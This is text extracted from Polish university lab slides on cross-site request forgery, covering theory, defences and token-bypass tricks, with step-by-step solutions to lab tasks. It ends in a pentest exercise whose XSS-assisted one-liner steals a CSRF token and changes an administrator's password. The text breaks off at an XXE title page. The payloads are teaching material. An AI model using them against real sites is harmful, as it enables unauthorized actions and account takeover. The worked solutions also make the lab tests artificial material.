### Strona 4 / 37

#### Tekst

```text
                   CSRF                                                                                                                                                                     PJA.EDU.PL

     Przygotowanie
      środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 14:49:24
```

### Strona 5 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij się, że maszyna WEB - CSRF jest włączona. Jeżeli coś
  się zepsuje, w każdej chwili możesz ją przywrócić do stanu początkowego.


  Wszystkie zadania rozwiązujemy za pomocą przygotowanego  panelu, którego  lokalizacja
  znajduje się w treści zadania.                                                                                                                        5
s32924 2026-06-21 14:49:24
```

### Strona 6 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN

  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

 sudo openvpn /sciezka/do/pliku.ovpn


                                                                                                                                                                              6
s32924 2026-06-21 14:49:24
```

### Strona 7 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                              7
s32924 2026-06-21 14:49:24
```

### Strona 8 / 37

#### Tekst

```text
                   CSRF                                                                                                                                                                     PJA.EDU.PL


         Teoria
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 14:49:24
```

### Strona 9 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Czym jest podatność CSRF?

  Cross-Site Request Forgery (CSRF) to rodzaj podatności bezpieczeństwa, który
  pozwala atakującemu na nakłonienie użytkownika do wykonania działań, których
  nie zamierzał wykonać, w  aplikacji internetowej, w której  jest zalogowany.
  Zazwyczaj odbywa się to poprzez wysłanie złośliwego żądania z innej strony, które
  docelowa strona mylnie traktuje jako prawidłowe żądanie od zalogowanego
  użytkownika. W rezultacie atakujący może wykonać takie czynności, jak zmiana
  ustawień  konta, dokonywanie zakupów czy  transfer  funduszy, bez wiedzy
  użytkownika. Aby zapobiec CSRF, deweloperzy często stosują techniki takie jak
  dodawanie unikalnych tokenów do żądań lub weryfikowanie pochodzenia żądań,
  aby upewnić się, że pochodzą one z zaufanych źródeł. Takie środki pomagają
  zapewnić, że tylko prawidłowe działania są wykonywane przez użytkownika
 w aplikacji internetowej.


                                                                                                                                                                              9
s32924 2026-06-21 14:49:24
```

### Strona 10 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Działanie CSRF

  Aby zapytanie było podatne,
  spełnione muszą zostać
  konkretne warunki.

                                          POST /transfer_funds HTTP/1.1  Zapytanie nie może posiadać
  żadnych losowych                                          Host: vulnerable.com
  parametrów. Wszystkie                                          Cookie: session=jgmeiu985ndaslkfj
  wartości muszą być
  deterministyczne.                        amount=100000&target=attacker123


                                                                                                                                                                                                           10
s32924 2026-06-21 14:49:24
```

### Strona 11 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Działanie CSRF

  Sesja musi opierać się na plikach
  cookies. Podczas ataku, sam użytkownik
  musi być zalogowany na podatnej
  stronie, tzn. mieć w pamięci                POST /transfer_funds HTTP/1.1
  przeglądarki ważny plik cookie.
                                          Host: vulnerable.com
                                          Cookie: session=jgmeiu985ndaslkfj
  Samo zapytanie powinno wykonywać                                          amount=100000&target=attacker123
  jakąś akcję lub czynność.


                                                                                                                                                                                                           11
s32924 2026-06-21 14:49:24
```

### Strona 12 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Działanie CSRF
  Mając podatne w ten sposób zapytanie, atakujący może przygotować stronę
  internetową, która automatycznie wykona zapytanie w imieniu ofiary - w dodatku
  bez jej wiedzy.

      <html>

          <body>

              <form action="https://vulnerable.com/transfer_funds" method="POST">

                  <input type="hidden" name="amount" value="100000" />

                  <input type="hidden" name="target" value="attacker123" />

              </form>

              <script>

                  document.forms[0].submit();

              </script>

          </body>

      </html>


                                                                                                                                                                                                           12
s32924 2026-06-21 14:49:24
```

### Strona 13 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Działanie CSRF


                                                              https://vulnerable.com
                                                              /transfer_funds?amount
                                                              =10000

        Atakujący               Ofiara klika          Przeglądarka ofiary             Zapytanie zostaje
      przygotowuje      w spreparowany       ładuje złośliwą stronę     zaakceptowane i przetworzone
      złośliwą stronę.                   link.                       i wykonuje zapytanie.      w imieniu zalogowanego
                                                                                   użytkownika.


                                                                                                                                                                                                           13
s32924 2026-06-21 14:49:24
```

### Strona 14 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Metody obrony przed CSRF

  Aby skutecznie chronić swoje aplikacje internetowe przed atakami Cross-Site
  Request Forgery (CSRF), warto wdrożyć kilka sprawdzonych metod obrony.


  1. Tokeny CSRF:  Najskuteczniejszym sposobem obrony  jest  stosowanie
  unikalnych tokenów CSRF. Tokeny te są generowane przez serwer i dołączane
  do formularzy oraz żądań. Każde żądanie, które zmienia stan na serwerze, musi
  zawierać ważny token, który jest weryfikowany przez serwer. W przypadku
  braku lub nieprawidłowego tokenu, żądanie jest odrzucane.


                                                                                                                                                                            14
s32924 2026-06-21 14:49:24
```

### Strona 15 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Metody obrony przed CSRF

  2. SameSite Cookies: Używanie atrybutu `SameSite` dla ciasteczek (cookies)
  to kolejna ważna technika. Atrybut ten może być ustawiony na Strict lub Lax,
  co ogranicza, w jakich kontekstach ciasteczka są przesyłane. Ustawienie
  SameSite=Strict zapewnia, że ciasteczka nie są wysyłane w kontekście żądań
  z zewnętrznych witryn, co utrudnia atakującym wykorzystanie ciasteczek
  do ataków CSRF.


  3. Weryfikacja Referer   i  Origin: Można również stosować  weryfikację
  nagłówków Referer i Origin. Te nagłówki mogą pomóc potwierdzić, że żądanie
  pochodzi z zaufanego źródła. Choć metoda ta nie jest tak bezpieczna jak
  tokeny CSRF, może stanowić dodatkową warstwę ochrony. Uwaga! Oszukanie
  tego mechanizmu jest dość proste, więc stosowanie go jako jedynej ochrony

                                                                                                                                                                            15  nie jest zalecane!s32924 2026-06-21 14:49:24
```

### Strona 16 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Metody obrony przed CSRF

  4. Ograniczenie metod HTTP: Inna praktyka to ograniczenie metod HTTP
  do tych, które są naprawdę potrzebne. Na przykład, metody takie jak GET
  powinny być używane tylko do pobierania danych, a zmiany stanu (np.
  aktualizacje, usunięcia) powinny być realizowane przez metody POST, PUT,
  lub DELETE.


  5. Regularne aktualizacje  i testowanie: Ważne  jest, aby  regularnie
  aktualizować oprogramowanie   i przeprowadzać  testy bezpieczeństwa.
  Często pojawiają się nowe techniki ataków oraz poprawki zabezpieczeń,
  które mogą pomóc w utrzymaniu aplikacji w bezpiecznym stanie.


                                                                                                                                                                            16
s32924 2026-06-21 14:49:24
```

### Strona 17 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Techniki omijania tokenów CSRF


  Walidacja odbywa się tylko jeśli parametr z tokenem jest obecny. Możemy jednak
  całkowicie usunąć token. Czasami to zadziała.

    POST /transfer_funds HTTP/1.1

    Host: vulnerable.com
    Cookie:
     session=jgmeiu985ndaslkfj

    amount=100000&target=attacker123


                                                                                                                                                                                                           17
s32924 2026-06-21 14:49:24
```

### Strona 18 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Techniki omijania tokenów CSRF

  Token jest niepowiązany z sesją użytkownika. W takim przypadku możemy
  uzyskać token używając własnej sesji i przekazać go do formularza dla ofiary.

  Walidacja jest zależna od rodzaju zapytania. Czasami zmiana zapytania z POST na
  GET pozwala całkowicie ominąć token CSRF.


    GET
     /transfer_funds?amount=100000&tar
     get=attacker123 HTTP/1.1

    Host: vulnerable.com
    Cookie: session=jgmeiu985ndaslkfj


                                                                                                                                                                                                           18
s32924 2026-06-21 14:49:24
```

### Strona 19 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Techniki omijania tokenów CSRF

  Walidacja tokenów może być przeprowadzona na wiele innych sposobów, w
  zależności od implementacji po stronie serwera. Warto zatem przyjrzeć się, jak
  są one generowane podczas  kolejnych  zapytań, szukając  anomalii,  które
  pozwalają na ominięcie środków bezpieczeństwa.


                                                                                                                                                                                                           19
s32924 2026-06-21 14:49:24
```

### Strona 20 / 37

#### Tekst

```text
                   CSRF                                                                                                                                                                     PJA.EDU.PL


        Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 14:49:24
```

### Strona 21 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.1: GET CSRF

  Zadanie  polega  na  przygotowaniu  właściwego  payloadu  na  podstronie
  http://192.168.100.12/payload/,  który  zasymuluje  kliknięcie  odpowiedniego
  przycisku na stronie http://192.168.100.12/site1/.
  Krok 1: Wyświetl źródło strony
     •  Kliknij prawym przyciskiem na stronę docelową i wybierz “View Page Source”
      (lub wciśnij Ctrl+U).
     •  Znajdź element, który chcesz odtworzyć (taki, który pozwoli na rozwiązanie
      zadania).
     •  Ujawnia on wszystkie nazwy danych wejściowych i szczegóły przesyłania.


                                                                                                                                                                            21
s32924 2026-06-21 14:49:24
```

### Strona 22 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.1: GET CSRF

   Krok 2: Skopuj odpowiedni kod do edytora tekstu
   <button onclick="location.href='?solve'">Solve 12.1!</button>
     • Na Site1 przycisk ma atrybut onclick, który wskazuje na funkcję, która ma
     zostać wykonana po naciśnięciu przycisku,
     • location.href pokazuje parametr, który ma zostać dołączony do łącza, aby
     uzyskać flagę. W tym przypadku parametrem jest ‘?solve’


                                                                                                                                                                            22
s32924 2026-06-21 14:49:24
```

### Strona 23 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.1: GET CSRF

     • Teraz musimy symulować tę akcję za pomocą znacznika script, używając
     poniższego skryptu
  <script>location.href="/site1/?solve";</script>
     • Zwróćmy uwagę, jak parametr z przycisku został dołączony na końcu łącza,
     aby emulować przycisk naciśnięty przez administratora.


                                                                                                                                                                            23
s32924 2026-06-21 14:49:24
```

### Strona 24 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.1: GET CSRF

  Zadanie zostanie automatycznie zaliczone po kliknięciu przycisku
  „Deliver to admin”. Wcześniej jednak nie zapomnij kliknąć „Save!”.


                                                                                                                                                                            24
s32924 2026-06-21 14:49:24
```

### Strona 25 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.2: POST CSRF
  Zadanie ma na celu przygotowanie odpowiedniego payloadu na podstronie
  http://192.168.100.12/payload/,  który  będzie  symulował  kliknięcie  przez
  administratora przycisku na stronie internetowej http://192.168.100.12/site2/.
  Krok 1: Wyświetl źródło oryginalnego elementu ze strony
   •  Kliknij prawym przyciskiem myszy na stronie docelowej  i wybierz „View Page
    Source” (lub naciśnij Ctrl+U).
   •  Zlokalizuj oryginalny element, który chcesz powielić, który ma możliwości
    rozwiązywania
   •  Ujawnia to wszystkie parametry  i elementy w formularzu, które mają zostać
    użyte do przesłania.


                                                                                                                                                                            25
s32924 2026-06-21 14:49:24
```

### Strona 26 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.2: POST CSRF

   Krok 2: Skopiuj formularz do edytora tekstu
  <form method="post" id="f">
        <input type="hidden" name="solve">
  </form>
  <button onclick="document.getElementById('f').submit()">Solve
  12.2!</button>
     • To prosty formularz HTML z metodą „post”, który zawiera ukryte pole
     o nazwie solve.
     • Nie ma atrybutu akcji, więc przesyła formularz do bieżącego adresu URL
      strony (domyślne zachowanie). Dostępny jest przycisk umożliwiający ręczne
      przesłanie formularza za pomocą JavaScript:
   Po    kliknięciu,    funkcja   document.getElementById('f').submit()     jest
   uruchamiana. Wymagana jest interakcja użytkownika (kliknięcie przycisku).
   Jednak wykorzystując payload będziemy w stanie symulować kliknięcie tego
                                                                                                                                                                            26
s32924 2026-06-21 14:49:24    przycisku przez użytkownika.
```

### Strona 27 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.2: POST CSRF

  Krok 3: Dodajmy kod JavaScript, który sam przesyła formularz
  <form method="post" action="/site2/" id="f">
        <input type="hidden" name="solve">
  </form>
  <script>document.getElementById('f').submit();</script>
  To struktura payloadu ataku CSRF.
   •  Formularz w tym ładunku używa metody „post”, aby naśladować prawidłowe
    przesłanie formularza.
   • Ma zakodowany na stałe parametr action="/site2/", skierowany do określonego
    punktu końcowego  i zawiera ukryte pole wejściowe o nazwie solve, które
   pomoże w rozwiązaniu zadania.


                                                                                                                                                                            27
s32924 2026-06-21 14:49:24
```

### Strona 28 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.2: POST CSRF

  <script> automatycznie wysyła formularz, kiedy strona zostanie załadowana, co
  oznacza brak interakcji użytkownika.

  /site2/ to adres, do którego mamy dostęp, a więc formularz automatycznie się
  przesyła.
  Przykładowy oneliner:

    <form method="post" action="/site2/" id="f"><input type="hidden" name="solve"></form><script>document.getElementById('f').submit();</script>


                                                                                                                                                                            28
s32924 2026-06-21 14:49:24
```

### Strona 29 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.2: POST CSRF

  Zadanie   zostanie   automatycznie   zaliczone   po    kliknięciu   przycisku
  „Deliver to admin”.


                                                                                                                                                                            29
s32924 2026-06-21 14:49:24
```

### Strona 30 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.3: CSRF TOKEN

  Zadanie ma na celu przygotowanie odpowiedniego payloadu na
  podstronie   http://192.168.100.12/payload/,    który   będzie
  symulował kliknięcie przycisku przez administratora na stronie
  internetowej  http://192.168.100.12/site3/.  Strona  internetowa
  jest zabezpieczona tokenem CSRF, który musi zostać odczytany
  przy użyciu ataku XSS.
  Krok 1: Wyświetl źródło oryginalnego elementu ze strony
   •  Kliknij  prawym  przyciskiem  myszy  na  stronie  docelowej
        i wybierz „View Page Source” (lub naciśnij Ctrl+U).
   •  Zlokalizuj oryginalny element, który chcesz powielić, który ma
    możliwości rozwiązywania
   •  Ujawnia to wszystkie parametry i elementy w formularzu, które
                                                                                                                                                                            30
s32924 2026-06-21 14:49:24    mają być użyte dla przycisku przesyłania.
```

### Strona 31 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.3: CSRF TOKEN

   Krok 2: Skopiujmy formularz do edytora tekstu
   <form method="post" id="f">
     <input type="hidden" name="solve"><input type="hidden" name="token"
     value="6836f2488cfa6">
   </form>
   <button onclick="document.getElementById('f').submit()">Solve
     12.3!</button>


                                                                                                                                                                            31
s32924 2026-06-21 14:49:24
```

### Strona 32 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.3: CSRF TOKEN

     • solve:  ukryty  parametr  wysyłany  do  serwera w  celu  pokazania,
     że rozwiązujemy zadanie
     • token: ukryte pole tokena zawierające token ochrony CSRF (6836f2488cfa6)
     mający chronić przed CSRF.
     • Formularz jest przesyłany ręcznie przez użytkownika klikającego przycisk.
     • Serwer oczekuje tej wartości tokena, aby solver był prawidłowy
     • Wymagana jest interakcja użytkownika (kliknięcie przycisku), aby zadanie
     mogło  zostać  rozwiązane.  Jednak  używając  ładunku,  będziemy  mogli
     symulować kliknięcie tego przycisku przez użytkownika.


                                                                                                                                                                            32
s32924 2026-06-21 14:49:24
```

### Strona 33 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.3: CSRF TOKEN

   Krok 3: Dodajmy kod JavaScript, który samodzielnie przesyła formularz
   <form method="post" action="/site3/">
     <input type="hidden" name="solve">
     <input type="hidden" name="token" id="t">
   </form>
   <script>document.forms[1].t.value=document.forms[0].token.value;document
     .forms[1].submit()</script>


                                                                                                                                                                            33
s32924 2026-06-21 14:49:24
```

### Strona 34 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.3: CSRF TOKEN

   To  jest  spreparowany  payload,  wysłany  na  stronę  administracyjną  za
     pośrednictwem strony ładunku na serwerze WWW.
   Przesyłany do /site3/, określonego endpointu.
   Kopiuje  token  z  document.forms[0].token.value  do  formularza  ataku
     (document.forms[1]) przed przesłaniem.
   Odbywa się to za pośrednictwem JavaScript:
   document.forms[1].t.value = document.forms[0].token.value;
     • po którym następuje automatyczne przesyłanie (co oznacza, że kliknięcie
      przycisku przez administratora jest symulowane automatycznie):
   document.forms[1].submit
  Oneliner:

                                                                                                                                                                            34      <form method="post" action="/site3/"><input type="hidden" name="solve"><input type="hidden" name="token" id="t"></form><script>document.forms[1].t.value=document.forms[0].token.value;document.forms[1].submit()</script>
s32924 2026-06-21 14:49:24
```

### Strona 35 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.3: CSRF TOKEN

  Zadanie   zostanie   automatycznie   zaliczone   po    kliknięciu   przycisku
  „Deliver to admin”.


                                                                                                                                                                            35
s32924 2026-06-21 14:49:24
```

### Strona 36 / 37

#### Tekst

```text
                    CSRF                                                                                  POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

   https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
  Metody zapobiegania atakom CSRF [EN]

  https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
  CSRF „Cheat-sheet” [EN]


                                                                                                                                                                            36
s32924 2026-06-21 14:49:24
```

### Strona 37 / 37

#### Tekst

```text
                   CSRF                                                                                                                                                                     PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 14:49:24
```

---

## 8. 12p. Cross-site Request Forgery PENTEST (1)(2).pdf

Liczba stron: 17


### Strona 1 / 17

#### Tekst

```text
                   CSRF | PENTEST                                                                                                                                                           PJA.EDU.PL
        Cross-site
    Request Forgery
        Pentest
                        KOMPUTEROWYCH                         Zajęcia nr 12
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 14:49:26
```

### Strona 2 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                               PRZYGOTOWANIE ŚRODOWISKA
                                                     Uruchamianie maszyn ………………………….……… 4
                                                         Połączenie OpenVPN …………………………………… 5

                                ZADANIA
                                                    12.1p Zwykły użytkownik ……………………..……… 8
                                                    12.2p XSS ………..……………….…………………..……. 10
                                                    12.3p CSRF …………………………………………….….. 12
                                                    12.4p Administrator ….…………………………….….. 14


                                                                                                                                                                              2
s32924 2026-06-21 14:49:26
```

### Strona 3 / 17

#### Tekst

```text
                   CSRF | PENTEST                                                                                                                                                           PJA.EDU.PL

     Przygotowanie
      środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 14:49:26
```

### Strona 4 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij się, że maszyny WEB - CSRF oraz WEB - CSRF
  PENTEST są włączone. Jeżeli coś się zepsuje, w każdej chwili możesz je przywrócić
  do stanu początkowego.


  Wszystkie zadania rozwiązujemy za pomocą przygotowanego panelu, którego  lokalizacja
  znajduje się w treści zadania.
                                                                                                                                                                              4
s32924 2026-06-21 14:49:26
```

### Strona 5 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN

  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

 sudo openvpn /sciezka/do/pliku.ovpn


                                                                                                                                                                              5
s32924 2026-06-21 14:49:26
```

### Strona 6 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                              6
s32924 2026-06-21 14:49:26
```

### Strona 7 / 17

#### Tekst

```text
                   CSRF | PENTEST                                                                                                                                                           PJA.EDU.PL


        Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 14:49:26
```

### Strona 8 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.1p: Zwykły użytkownik

  Głównym celem zadania jest zalogowanie się na konto Administratora.
  Na początku jednak musimy zalogować się na konto zwykłego użytkownika:
  URL: http://192.168.100.62/
  Nazwa: student
  Hasło: pjatk


  Zwróć uwagę na token CSRF w  formularzu!  Jest on  przypisany do  sesji
    i uniemożliwia najgroźniejsze scenariusze CSRF.


                                                                                                                                                                              8
s32924 2026-06-21 14:49:26
```

### Strona 9 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.1p: Zwykły użytkownik

  Zadanie zostanie automatycznie zaliczone po zalogowaniu.


                                                                                                                                                                              9
s32924 2026-06-21 14:49:26
```

### Strona 10 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.2p: XSS

  Celem   zadania    jest   znalezienie   podatności   XSS   na   podstronie:
  http://192.168.100.62/activity/


  Przykład - użycie nieprawidłowego tokenu jest logowane:
  http://192.168.100.62/activity/?clear=&token=<b>XSS</b>


                                                                                                                                                                            10
s32924 2026-06-21 14:49:26
```

### Strona 11 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.2p: XSS

  Zadanie zostanie automatycznie zaliczone po znalezieniu podatności XSS:


                                                                                                                                                                            11
s32924 2026-06-21 14:49:26
```

### Strona 12 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.3p: CSRF

  Celem zadania jest wykorzystanie podatności CSRF (za pośrednictwem XSS)
  do zmiany hasła Administratora. Podatność XSS umożliwia odczytanie tokenu
  CSRF na stronie i ominięcie zabezpieczenia! Atak należy opóźnić o około sekundę
  (funkcja setTimeout), aby strona  - łącznie z tokenem CSRF  - wczytała  się
  do końca!


  Przykład:

   <form method="post" action="/profile/"><input type="hidden" name="password1" value="pjatk"><input
   type="hidden" name="password2" value="pjatk"><input type="hidden" name="token"
   id="t"></form><script>setTimeout('document.forms[0].t.value=document.forms[1].token.value;document.forms[
   0].submit()', 1000)</script>


   „Oneliner” do skopiowania:


         <form method="post" action="/profile/"><input type="hidden" name="password1" value="pjatk"><input type="hidden" name="password2" value="pjatk"><input type="hidden" name="token" id="t"></form><script>setTimeout('document.forms[0].t.value=document.forms[1].token.value;document.forms[0].submit()', 1000)</script>

                                                                                                                                                                            12
s32924 2026-06-21 14:49:26
```

### Strona 13 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.3p: CSRF

  Poprawnie wykonany payload powinien przekierować użytkownika na podstronę
  /profile/ i zmienić mu hasło:


                                                                                                                                                                            13
s32924 2026-06-21 14:49:26
```

### Strona 14 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.4p: Administrator

  Celem  zadania  jest  zalogowanie  się na  konto  Administratora  za pomocą
  podmienionego hasła.


                                                                                                                                                                            14
s32924 2026-06-21 14:49:26
```

### Strona 15 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 12.4p: Administrator

  Zadanie zostanie zaliczone automatycznie.


                                                                                                                                                                            15
s32924 2026-06-21 14:49:26
```

### Strona 16 / 17

#### Tekst

```text
                    CSRF | PENTEST                                                                        POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://cheatsheetseries.owasp.org/cheatsheets/Cross-
  Site_Request_Forgery_Prevention_Cheat_Sheet.html
  Metody zapobiegania atakom CSRF [EN]

  https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
 CSRF „Cheat-sheet” [EN]


                                                                                                                                                                            16
s32924 2026-06-21 14:49:26
```

### Strona 17 / 17

#### Tekst

```text
                   CSRF | PENTEST                                                                                                                                                           PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 14:49:26
```

---

## 9. 13. XXE (4)(1).pdf

Liczba stron: 36


### Strona 1 / 36

#### Tekst

```text
                   XML EXTERNAL ENTITIES                                                                                                                                                    PJA.EDU.PL
    XML External
         Entities

                        KOMPUTEROWYCH                         Zajęcia nr 13
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 19:20:00
```

### Strona 2 / 36

#### Tekst

```text
